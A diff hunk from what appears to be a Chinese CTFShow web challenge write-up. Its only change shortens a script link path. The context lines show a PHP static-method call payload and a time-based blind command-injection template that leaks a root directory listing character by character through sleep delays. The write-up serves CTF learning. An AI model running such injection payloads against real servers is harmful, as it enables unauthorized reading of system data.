@@ -329,7 +329,7 @@ payload：`ctfshow[0]=ctfshow&ctfshow[1]=getFlag`数组形式调用静态方法
 ## 139
 ![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1783824304169_image.png)
 与136很像，这一题需要命令盲注
-[脚本](xobear.cn\CTF\Web\PHP\139.py)
+[脚本](\139.py)
 
 
 ```if [ `ls / -1 |cut -c {} | awk \"NR=={}\"`  ==  \"{}\" ];then sleep 4;fi```
